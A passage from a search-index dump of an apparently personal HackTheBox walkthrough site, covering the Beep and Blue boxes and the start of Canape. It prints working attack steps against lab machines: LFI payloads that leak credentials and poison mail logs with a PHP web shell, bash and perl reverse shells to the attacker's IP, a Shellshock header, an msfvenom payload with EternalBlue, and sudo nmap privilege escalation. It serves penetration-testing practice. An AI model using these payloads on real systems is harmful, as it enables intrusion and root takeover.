IMPLEMENTATION(Cyrus POP3 server v2) TOP AUTH-RESP-CODE LOGIN-DELAY(0) USER APOP PIPELINING 111/tcp open rpcbind 2 (RPC #100000) | rpcinfo: | program version port/proto service | 100000 2 111/tcp rpcbind | 100000 2 111/udp rpcbind | 100024 1 875/udp status |_ 100024 1 878/tcp status 143/tcp open imap Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4 |_imap-capabilities: IMAP4rev1 Completed RENAME THREAD=REFERENCES ID MAILBOX-REFERRALS URLAUTHA0001 X-NETSCAPE CATENATE LIST-SUBSCRIBED LISTEXT QUOTA NAMESPACE IDLE CONDSTORE ATOMIC ACL ANNOTATEMORE BINARY MULTIAPPEND LITERAL+ OK SORT NO THREAD=ORDEREDSUBJECT RIGHTS=kxte SORT=MODSEQ UNSELECT CHILDREN STARTTLS UIDPLUS IMAP4 443/tcp open ssl/https? | ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=-- | Not valid before: 2017-04-07T08:22:08 |_Not valid after: 2018-04-07T08:22:08 |_ssl-date: 2021-04-02T03:57:36+00:00; +13m59s from scanner time. 878/tcp open status 1 (RPC #100024) 993/tcp open ssl/imap Cyrus imapd |_imap-capabilities: CAPABILITY 995/tcp open pop3 Cyrus pop3d 3306/tcp open mysql MySQL (unauthorized) |_ssl-cert: ERROR: Script execution failed (use -d to debug) |_ssl-date: ERROR: Script execution failed (use -d to debug) |_sslv2: ERROR: Script execution failed (use -d to debug) |_tls-alpn: ERROR: Script execution failed (use -d to debug) |_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug) 4190/tcp open sieve Cyrus timsieved 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4 (included w/cyrus imap) 4445/tcp open upnotifyp? 4559/tcp open hylafax HylaFAX 4.3.10 5038/tcp open asterisk Asterisk Call Manager 1.1 10000/tcp open http MiniServ 1.570 (Webmin httpd) |_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1). Service Info: Hosts: beep.localdomain, 127.0.0.1, example.com, localhost; OS: Unix Host script results: |_clock-skew: 13m58s Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 400.58 seconds","title":"Openning Services"},{"location":"walkthrough/hackthebox/Beep/index.html#postfix-smtpd","text":"Using nmap scan smtp service with nse script. ### SMTP Enumeration (25) ############################ nmap 10.10.10.7 -p25 -Pn --script=smtp-* <snip> PORT STATE SERVICE 25/tcp open smtp |_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, | smtp-enum-users: |_ Method RCPT returned a unhandled status code. |_smtp-open-relay: Server doesn't seem to be an open relay, all tests failed | smtp-vuln-cve2010-4344: |_ The SMTP server is not Exim: NOT VULNERABLE Nmap done: 1 IP address (1 host up) scanned in 41.72 seconds Access to SMTP service and try to sent a email. \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[1.9:27.1]~/walkthrough/hackthebox/beep \u2514\u2500$ nc -nC 10.10.10.7 25 220 beep.localdomain ESMTP Postfix mail from: \"hades\" 250 2.1.0 Ok rcpt to: \"root\" 250 2.1.5 Ok data 354 End data with <CR><LF>.<CR><LF> leecybersec . 250 2.0.0 Ok: queued as 25368D92FD","title":"Postfix smtpd"},{"location":"walkthrough/hackthebox/Beep/index.html#apache223-centos","text":"At port 80, using gobuster to get a list of hidden in the web port. Should try more wordlist files if the results is not interesting. ### Web Enumeration (443) ############################ [+] Files and directories gobuster dir -k -u https://10.10.10.7:443 -w /usr/share/seclists/Discovery/Web-Content/common.txt <snip> =============================================================== /.hta (Status: 403) [Size: 282] /.htaccess (Status: 403) [Size: 287] /.htpasswd (Status: 403) [Size: 287] /admin (Status: 301) [Size: 309] [--> https://10.10.10.7/admin/] /cgi-bin/ (Status: 403) [Size: 286] /configs (Status: 301) [Size: 311] [--> https://10.10.10.7/configs/] /favicon.ico (Status: 200) [Size: 894] /help (Status: 301) [Size: 308] [--> https://10.10.10.7/help/] /images (Status: 301) [Size: 310] [--> https://10.10.10.7/images/] /index.php (Status: 200) [Size: 1785] /lang (Status: 301) [Size: 308] [--> https://10.10.10.7/lang/] /libs (Status: 301) [Size: 308] [--> https://10.10.10.7/libs/] /mail (Status: 301) [Size: 308] [--> https://10.10.10.7/mail/] /modules (Status: 301) [Size: 311] [--> https://10.10.10.7/modules/] /panel (Status: 301) [Size: 309] [--> https://10.10.10.7/panel/] /robots.txt (Status: 200) [Size: 28] /static (Status: 301) [Size: 310] [--> https://10.10.10.7/static/] /themes (Status: 301) [Size: 310] [--> https://10.10.10.7/themes/] /var (Status: 301) [Size: 307] [--> https://10.10.10.7/var/] <snip>","title":"Apache/2.2.3 (CentOS)"},{"location":"walkthrough/hackthebox/Beep/index.html#elastix","text":"At the url https://10.10.10.7 I saw a Elastix web application. \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[1.9:26.8]~/walkthrough/hackthebox/beep \u2514\u2500$ searchsploit elastix ---------------------------------------------------- --------------------------------- Exploit Title | Path ---------------------------------------------------- --------------------------------- <snip> Elastix 2.2.0 - 'graph.php' Local File Inclusion | php/webapps/37637.pl Elastix 2.x - Blind SQL Injection | php/webapps/36305.txt Elastix < 2.5 - PHP Code Injection | php/webapps/38091.php FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execut | php/webapps/18650.py ---------------------------------------------------- --------------------------------- Shellcodes: No Results","title":"Elastix"},{"location":"walkthrough/hackthebox/Beep/index.html#freepbx-2814","text":"Follow the uri /admin , this is FreePBX web application. \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[1.9:28.6]~/walkthrough/hackthebox/beep \u2514\u2500$ searchsploit FreePBX 2.8.1.4 ---------------------------------------------------- --------------------------------- Exploit Title | Path ---------------------------------------------------- --------------------------------- FreePBX < 13.0.188 - Remote Command Execution (Meta | php/remote/40434.rb Freepbx < 2.11.1.5 - Remote Code Execution | php/webapps/41005.txt ---------------------------------------------------- --------------------------------- Shellcodes: No Results","title":"FreePBX 2.8.1.4"},{"location":"walkthrough/hackthebox/Beep/index.html#roundcube-webmail","text":"Follow the uri /mail , this is RoundCube Webmail web application.","title":"RoundCube Webmail"},{"location":"walkthrough/hackthebox/Beep/index.html#vtiger-crm-510","text":"At the exploit 37637.pl , I saw in the payload contain url vtigercrm . \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[1.9:31.0]~/scripting \u2514\u2500$ searchsploit vtiger CRM 5.1.0 ---------------------------------------------------- --------------------------------- Exploit Title | Path ---------------------------------------------------- --------------------------------- vTiger CRM 5.1.0 - Local File Inclusion | php/webapps/18770.txt ---------------------------------------------------- --------------------------------- Shellcodes: No Results","title":"vtiger CRM 5.1.0"},{"location":"walkthrough/hackthebox/Beep/index.html#miniserv-1570","text":"Webmin application is running on port 10000. After try to login with some default username/password, the web app redirect to login page with uri /session_login.cgi \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[1.9:29.5]~/walkthrough/hackthebox/beep \u2514\u2500$ searchsploit Webmin cgi ---------------------------------------------------- --------------------------------- Exploit Title | Path ---------------------------------------------------- --------------------------------- <snip> Webmin 1.5 - Web Brute Force (CGI) | multiple/remote/745.pl Webmin 1.580 - '/file/show.cgi' Remote Command Exec | unix/remote/21851.rb Webmin 1.850 - Multiple Vulnerabilities | cgi/webapps/42989.txt Webmin 1.900 - Remote Command Execution (Metasploit | cgi/remote/46201.rb Webmin 1.x - HTML Email Command Execution | cgi/webapps/24574.txt Webmin < 1.920 - 'rpc.cgi' Remote Code Execution (M | linux/webapps/47330.rb ---------------------------------------------------- --------------------------------- Shellcodes: No Results","title":"MiniServ 1.570"},{"location":"walkthrough/hackthebox/Beep/index.html#foothold","text":"","title":"Foothold"},{"location":"walkthrough/hackthebox/Beep/index.html#lfi-leaked-credential","text":"At exploit php/webapps/37637.pl , I saw the LFI Exploit showing the amportal.conf contain password jEhdIekWmdjE . This password have been used to any account listed in file. view-source:https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../../../../../..//etc/amportal.conf%00&module=Accounts&action <snip> AMPDBPASS=jEhdIekWmdjE AMPMGRPASS=jEhdIekWmdjE FOPPASSWORD=jEhdIekWmdjE ARI_ADMIN_PASSWORD=jEhdIekWmdjE Make a guess, I try this password with root's ssh credential. \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[2.1:30.7]~/walkthrough/hackthebox/beep \u2514\u2500$ ssh root@10.10.10.7 root@10.10.10.7's password: Last login: Fri Apr 2 10:27:42 2021 from 10.10.14.5 Welcome to Elastix ---------------------------------------------------- To access your Elastix System, using a separate workstation (PC/MAC/Linux) Open the Internet Browser using the following URL: http://10.10.10.7 [root@beep ~]# id uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel) [root@beep ~]#","title":"LFI leaked Credential"},{"location":"walkthrough/hackthebox/Beep/index.html#lfi-and-postfix-smtpd","text":"Poc code here After gathering information in the server, I have 2 LFI vulnerabilities: Elastix 2.2.0 - 'graph.php' Local File Inclusion vTiger CRM 5.1.0 - Local File Inclusion Get the user account in the server. view-source:https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../../../../../..//etc/passwd%00&module=Accounts&action view-source:https://10.10.10.7/vtigercrm/modules/com_vtiger_workflow/sortfieldsjson.php?module_name=../../../../../../../../etc/passwd%00&cmd=id I grep only user can execute shell root:x:0:0:root:/root:/bin/bash mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bash cyrus:x:76:12:Cyrus IMAP Server:/var/lib/imap:/bin/bash asterisk:x:100:101:Asterisk VoIP PBX:/var/lib/asterisk:/bin/bash spamfilter:x:500:500::/home/spamfilter:/bin/bash fanis:x:501:501::/home/fanis:/bin/bash To create a backdoor, go first with SMTP service. I access to it and sent a mail contain php backdoor code to user asterisk . \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[2.1:32.9]~/walkthrough/hackthebox/beep \u2514\u2500$ nc -nC 10.10.10.7 25 220 beep.localdomain ESMTP Postfix vrfy asterisk@localhost 252 2.0.0 asterisk@localhost mail from: \"hades <?php system($_GET['cmd']); ?> hades\" 250 2.1.0 Ok rcpt to: \"asterisk\" 250 2.1.5 Ok data 354 End data with <CR><LF>.<CR><LF> . 250 2.0.0 Ok: queued as A3254D92FD quit 221 2.0.0 Bye After sent a mail, I using LFI go to asterisk's mail file at /var/mail/asterisk Get reverse shell Url encode using hURL to encode payload. \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[2.1:30.7]~/walkthrough/hackthebox/beep \u2514\u2500$ hURL -U \"bash -c 'bash -i >& /dev/tcp/10.10.14.5/443 0>&1'\" Original :: bash -c 'bash -i >& /dev/tcp/10.10.14.5/443 0>&1' URL ENcoded :: bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.5%2F443%200%3E%261%27 Execute bash reverse shell. view-source:https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../../../../../..//var/mail/asterisk%00&module=Accounts&action&cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.5%2F443%200%3E%261%27 view-source:https://10.10.10.7/vtigercrm/modules/com_vtiger_workflow/sortfieldsjson.php?module_name=../../../../../../../..//var/mail/asterisk%00&cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.5%2F443%200%3E%261%27 Listener in Kali machine \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[2.1:30.6]~/walkthrough/hackthebox/beep \u2514\u2500$ sudo nc -nvlp 443 listening on [any] 443 ... connect to [10.10.14.5] from (UNKNOWN) [10.10.10.7] 53748 bash: no job control in this shell bash-3.2$ id uid=100(asterisk) gid=101(asterisk) groups=101(asterisk) bash-3.2$","title":"LFI and Postfix smtpd"},{"location":"walkthrough/hackthebox/Beep/index.html#voip-command-injection","text":"Poc code here I used exploit php/webapps/18650.py found when I enum Elastix. Detect VoIP system using svmap \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[2.1:20.3]~/walkthrough/hackthebox/beep \u2514\u2500$ svmap 10.10.10.7 +-----------------+---------------------+-------------+ | SIP Device | User Agent | Fingerprint | +=================+=====================+=============+ | 10.10.10.7:5060 | FPBX-2.8.1(1.8.7.0) | disabled | +-----------------+---------------------+-------------+ Find the extension in the server with svwar -m method REGISTER (default), OPTIONS and INVITE -e RANGE There are an authentication when I use method REGISTER, I also have no OPTIONS, I use INVITE to call in the chanel with range of extension 100-300. \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[1.3:20.3]~/walkthrough/hackthebox/beep \u2514\u2500$ svwar -m INVITE -e100-300 10.10.10.7 <snip> +-----------+----------------+ | Extension | Authentication | +===========+================+ | 233 | reqauth | +-----------+----------------+ | 229 | weird | +-----------+----------------+ In the exploit the extension=\"233\", I was drop some sys.argv and query the url with firefox. IppSec HackTheBox Beep \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[1.5:21.3]~/walkthrough/hackthebox/beep \u2514\u2500$ python3 18650.py 233 10.10.10.7 10.10.14.5 443 https://10.10.10.7/recordings/misc/callme_page.php?action=c&callmenum=233@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%2210.10.14.5%3a443%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw%29%3bsystem%24%5f%20while%3c%3e%3b%27%0D%0A%0D%0A Listener in Kali machine \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[2.2:50.6]~ \u2514\u2500$ sudo nc -nvlp 443 listening on [any] 443 ... connect to [10.10.14.5] from (UNKNOWN) [10.10.10.7] 47806 id uid=100(asterisk) gid=101(asterisk) python -c \"import pty;pty.spawn('/bin/bash')\" bash-3.2$","title":"VoIP Command Injection"},{"location":"walkthrough/hackthebox/Beep/index.html#webmin-shellshock","text":"Poc code here Webmin using session_login.cgi , it can be exploit using shellshock payload. Payload: User-Agent: () { :; }; echo; /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.5/443 0>&1' Listener in Kali machine \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[2.1:30.8]~ \u2514\u2500$ sudo nc -nvlp 443 listening on [any] 443 ... connect to [10.10.14.5] from (UNKNOWN) [10.10.10.7] 40293 bash: no job control in this shell [root@beep webmin]# id uid=0(root) gid=0(root) [root@beep webmin]#","title":"Webmin Shellshock"},{"location":"walkthrough/hackthebox/Beep/index.html#privilege-escalation","text":"","title":"Privilege Escalation"},{"location":"walkthrough/hackthebox/Beep/index.html#nmap-suid","text":"Back to shell at LFI and Postfix smtpd , I enumed server with linpeas.sh bash-3.2$ sudo -l <snip> User asterisk may run the following commands on this host: (root) NOPASSWD: /sbin/shutdown (root) NOPASSWD: /usr/bin/nmap (root) NOPASSWD: /usr/bin/yum (root) NOPASSWD: /bin/touch (root) NOPASSWD: /bin/chmod (root) NOPASSWD: /bin/chown (root) NOPASSWD: /sbin/service (root) NOPASSWD: /sbin/init (root) NOPASSWD: /usr/sbin/postmap (root) NOPASSWD: /usr/sbin/postfix (root) NOPASSWD: /usr/sbin/saslpasswd2 (root) NOPASSWD: /usr/sbin/hardware_detector (root) NOPASSWD: /sbin/chkconfig (root) NOPASSWD: /usr/sbin/elastix-helper GTFOBins bash-3.2$ sudo /usr/bin/nmap --interactive Starting Nmap V. 4.11 ( http://www.insecure.org/nmap/ ) Welcome to Interactive Mode -- press h <enter> for help nmap> !sh sh-3.2# whoami root sh-3.2#","title":"Nmap SUID"},{"location":"walkthrough/hackthebox/Blue/index.html","text":"HackTheBox Blue Author: Hades Scripting here Information Gathering Openning Services ### Port Scanning ############################ nmap -sS -p- --min-rate 1000 10.10.10.40 | grep ^[0-9] | cut -d '/' -f1 | tr '\\n' ',' | sed s/,$// [+] Openning ports: 135,139,445,49152,49153,49154,49155,49156,49157 ### Services Enumeration ############################ nmap -sC -sV -Pn 10.10.10.40 -p135,139,445,49152,49153,49154,49155,49156,49157 Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-05 11:11 +07 Nmap scan report for 10.10.10.40 Host is up (0.27s latency). PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP) 49152/tcp open msrpc Microsoft Windows RPC 49153/tcp open msrpc Microsoft Windows RPC 49154/tcp open msrpc Microsoft Windows RPC 49155/tcp open msrpc Microsoft Windows RPC 49156/tcp open msrpc Microsoft Windows RPC 49157/tcp open msrpc Microsoft Windows RPC Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: -5m56s, deviation: 34m36s, median: 14m02s | smb-os-discovery: | OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1) | OS CPE: cpe:/o:microsoft:windows_7::sp1:professional | Computer name: haris-PC | NetBIOS computer name: HARIS-PC\\x00 | Workgroup: WORKGROUP\\x00 |_ System time: 2021-04-05T05:26:21+01:00 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2021-04-05T04:26:20 |_ start_date: 2021-04-05T04:23:24 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 79.31 seconds Server Message Block \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[2.7:14.3]~/scripting \u2514\u2500$ sudo nmap --script smb-vul* 10.10.10.40 -p 139,445 Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-05 11:15 +07 Nmap scan report for 10.10.10.40 Host is up (0.28s latency). PORT STATE SERVICE 139/tcp open netbios-ssn 445/tcp open microsoft-ds Host script results: |_smb-vuln-ms10-054: false |_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND | smb-vuln-ms17-010: | VULNERABLE: | Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010) | State: VULNERABLE | IDs: CVE:CVE-2017-0143 | Risk factor: HIGH | A critical remote code execution vulnerability exists in Microsoft SMBv1 | servers (ms17-010). | | Disclosure date: 2017-03-14 | References: | https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143 | https://technet.microsoft.com/en-us/library/security/ms17-010.aspx |_ https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/ Nmap done: 1 IP address (1 host up) scanned in 16.97 seconds Enum using smbmap without add user guest, I have nothing. \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[1.9:14.7]~/walkthrough/hackthebox/blue \u2514\u2500$ smbmap -H 10.10.10.40 [+] IP: 10.10.10.40:445 Name: 10.10.10.40 Adding user guest to tools, it's work now. \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[1.9:14.7]~/walkthrough/hackthebox/blue \u2514\u2500$ smbmap -H 10.10.10.40 -u guest [+] IP: 10.10.10.40:445 Name: 10.10.10.40 Disk Permissions Comment ---- ----------- ------- ADMIN$ NO ACCESS Remote Admin C$ NO ACCESS Default share IPC$ NO ACCESS Remote IPC Share READ ONLY Users READ ONLY Foothold EternalBlue Poc code here I drop an exploit cmd.py at Legacy box . Copy and run it for Blue. Create shell.exe file to open reverse shell. \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[1.9:14.9]~ \u2514\u2500$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=443 EXITFUNC=thread -f exe > shell.exe Open smb server in kali at folder contain file shell.exe . \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[2.6:14.3]~ \u2514\u2500$ sudo smbserver.py public /home/kali/walkthrough/hackthebox/blue > /dev/null Execute payload after modify the USERNAME = 'guest' . \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[1.9:14.9]~/walkthrough/hackthebox/blue \u2514\u2500$ sudo python cmd.py 10.10.10.40 '\\\\10.10.14.5\\public\\shell.exe' > /dev/null Reverse shell at listener. \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[2.6:14.4]~ \u2514\u2500$ sudo nc -nvlp 443 [sudo] password for kali: listening on [any] 443 ... connect to [10.10.14.5] from (UNKNOWN) [10.10.10.40] 49159 Microsoft Windows [Version 6.1.7601] Copyright (c) 2009 Microsoft Corporation. All rights reserved. C:\\Windows\\system32>whoami whoami nt authority\\system","title":"HTB Blue"},{"location":"walkthrough/hackthebox/Blue/index.html#hackthebox-blue","text":"Author: Hades Scripting here","title":"HackTheBox Blue"},{"location":"walkthrough/hackthebox/Blue/index.html#information-gathering","text":"","title":"Information Gathering"},{"location":"walkthrough/hackthebox/Blue/index.html#openning-services","text":"### Port Scanning ############################ nmap -sS -p- --min-rate 1000 10.10.10.40 | grep ^[0-9] | cut -d '/' -f1 | tr '\\n' ',' | sed s/,$// [+] Openning ports: 135,139,445,49152,49153,49154,49155,49156,49157 ### Services Enumeration ############################ nmap -sC -sV -Pn 10.10.10.40 -p135,139,445,49152,49153,49154,49155,49156,49157 Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-05 11:11 +07 Nmap scan report for 10.10.10.40 Host is up (0.27s latency). PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP) 49152/tcp open msrpc Microsoft Windows RPC 49153/tcp open msrpc Microsoft Windows RPC 49154/tcp open msrpc Microsoft Windows RPC 49155/tcp open msrpc Microsoft Windows RPC 49156/tcp open msrpc Microsoft Windows RPC 49157/tcp open msrpc Microsoft Windows RPC Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: -5m56s, deviation: 34m36s, median: 14m02s | smb-os-discovery: | OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1) | OS CPE: cpe:/o:microsoft:windows_7::sp1:professional | Computer name: haris-PC | NetBIOS computer name: HARIS-PC\\x00 | Workgroup: WORKGROUP\\x00 |_ System time: 2021-04-05T05:26:21+01:00 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2021-04-05T04:26:20 |_ start_date: 2021-04-05T04:23:24 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 79.31 seconds","title":"Openning Services"},{"location":"walkthrough/hackthebox/Blue/index.html#server-message-block","text":"\u250c\u2500\u2500(Hades\u327f10.10.14.5)-[2.7:14.3]~/scripting \u2514\u2500$ sudo nmap --script smb-vul* 10.10.10.40 -p 139,445 Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-05 11:15 +07 Nmap scan report for 10.10.10.40 Host is up (0.28s latency). PORT STATE SERVICE 139/tcp open netbios-ssn 445/tcp open microsoft-ds Host script results: |_smb-vuln-ms10-054: false |_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND | smb-vuln-ms17-010: | VULNERABLE: | Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010) | State: VULNERABLE | IDs: CVE:CVE-2017-0143 | Risk factor: HIGH | A critical remote code execution vulnerability exists in Microsoft SMBv1 | servers (ms17-010). | | Disclosure date: 2017-03-14 | References: | https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143 | https://technet.microsoft.com/en-us/library/security/ms17-010.aspx |_ https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/ Nmap done: 1 IP address (1 host up) scanned in 16.97 seconds Enum using smbmap without add user guest, I have nothing. \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[1.9:14.7]~/walkthrough/hackthebox/blue \u2514\u2500$ smbmap -H 10.10.10.40 [+] IP: 10.10.10.40:445 Name: 10.10.10.40 Adding user guest to tools, it's work now. \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[1.9:14.7]~/walkthrough/hackthebox/blue \u2514\u2500$ smbmap -H 10.10.10.40 -u guest [+] IP: 10.10.10.40:445 Name: 10.10.10.40 Disk Permissions Comment ---- ----------- ------- ADMIN$ NO ACCESS Remote Admin C$ NO ACCESS Default share IPC$ NO ACCESS Remote IPC Share READ ONLY Users READ ONLY","title":"Server Message Block"},{"location":"walkthrough/hackthebox/Blue/index.html#foothold","text":"","title":"Foothold"},{"location":"walkthrough/hackthebox/Blue/index.html#eternalblue","text":"Poc code here I drop an exploit cmd.py at Legacy box . Copy and run it for Blue. Create shell.exe file to open reverse shell. \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[1.9:14.9]~ \u2514\u2500$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=443 EXITFUNC=thread -f exe > shell.exe Open smb server in kali at folder contain file shell.exe . \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[2.6:14.3]~ \u2514\u2500$ sudo smbserver.py public /home/kali/walkthrough/hackthebox/blue > /dev/null Execute payload after modify the USERNAME = 'guest' . \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[1.9:14.9]~/walkthrough/hackthebox/blue \u2514\u2500$ sudo python cmd.py 10.10.10.40 '\\\\10.10.14.5\\public\\shell.exe' > /dev/null Reverse shell at listener. \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[2.6:14.4]~ \u2514\u2500$ sudo nc -nvlp 443 [sudo] password for kali: listening on [any] 443 ... connect to [10.10.14.5] from (UNKNOWN) [10.10.10.40] 49159 Microsoft Windows [Version 6.1.7601] Copyright (c) 2009 Microsoft Corporation. All rights reserved. C:\\Windows\\system32>whoami whoami nt authority\\system","title":"EternalBlue"},{"location":"walkthrough/hackthebox/Canape/index.html","text":"HackTheBox Canape Author: Hades Scripting here Information Gathering Openning Services ### Port Scanning ############################ nmap -sS -Pn -p- --min-rate 1000 10.10.10.70 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower. [+] Openning ports: 80,65535 ### Services Enumeration ############################ nmap -sC -sV -Pn 10.10.10.70 -p80,65535 Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-12 14:39 +07 Nmap scan report for 10.10.10.70 Host is up (0.28s latency). PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) | http-git: | 10.10.10.70:80/.git/ | Git repository found! | Repository description: Unnamed repository; edit this file 'description' to name the... | Last commit message: final # Please enter the commit message for your changes. Li... | Remotes: |_ http://git.canape.htb/simpsons.git |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Simpsons Fan Site |_http-trane-info: Problem with XML parsing of /evox/about 65535/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 8d:82:0b:31:90:e4:c8:85:b2:53:8b:a1:7c:3b:65:e1 (RSA) | 256 22:fc:6e:c3:55:00:85:0f:24:bf:f5:79:6c:92:8b:68 (ECDSA) |_ 256 0d:91:27:51:80:5e:2b:a3:81:0d:e9:d8:5c:9b:77:35 (ED25519) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 16.87 seconds Apache httpd 2.4.18 At port 80, the web application developed by Simpson from 2018. List of the hidden in the server using wfuzz \u250c\u2500\u2500(Hades\u327f10.10.14.6)-[0.4:25.2]~ \u2514\u2500$ wfuzz -z file,/usr/share/seclists/Discovery/Web-Content/common.txt --hw 1 --hl 82 'http://10.10.10.70/FUZZ' <snip> Target: http://10.10.10.70/FUZZ Total requests: 4681 <snip> 000000012: 200 9 L 43 W 1075 Ch \".git/index\" 000000013: 200 17 L 70 W 1130 Ch \".git/logs/\" 000000011: 200 11 L 29 W 259 Ch \".git/config\" 000000010: 200 1 L 2 W 23 Ch \".git/HEAD\" 000000008: 301 9 L 28 W 309 Ch \".git\" 000001026: 403 11 L 32 W 294 Ch \"cgi-bin/\" 000001060: 405 4 L 23 W 178 Ch \"check\" 000003371: 200 85 L 227 W 3150 Ch \"quotes\" 000003682: 403 11 L 32 W 299 Ch \"server-status\" 000003923: 301 9 L 28 W 311 Ch \"static\" 000003967: 200 81 L 167 W 2836 Ch \"submit\" <snip> Based on nmap and wfuzz result, I saw this web app public folder .git and it's may leak some sensitive source code. Dump folder .git if repo not available using GitHacker , git_dumper or command wget --mirror -I .git example.com/.git/ Checking config file, the source code is currently at repo http://git.canape.htb/simpsons.git . \u250c\u2500\u2500(Hades\u327f10.10.14.6)-[1.2:47.4]~/scripting/services \u2514\u2500$ curl http://10.10.10.70/.git/config [core] repositoryformatversion = 0 filemode = true bare = false logallrefupdates = true [remote \"origin\"] url = http://git.canape.htb/simpsons.git fetch = +refs/heads/*:refs/remotes/origin/* [branch \"master\"] remote = origin merge = refs/heads/master Add domain git.canape.htb with 10.10.10.70 to file hosts and clone the source code. \u250c\u2500\u2500(Hades\u327f10.10.14.6)-[1.2:47.4]~/walkthrough/hackthebox/canape \u2514\u2500$ git clone http://git.canape.htb/simpsons.git Cloning into 'simpsons'... remote: Counting objects: 49, done. remote: Compressing objects: 100% (47/47), done. remote: Total 49 (delta 18), reused 0 (delta 0) Unpacking objects: 100% (49/49), 163.16 KiB 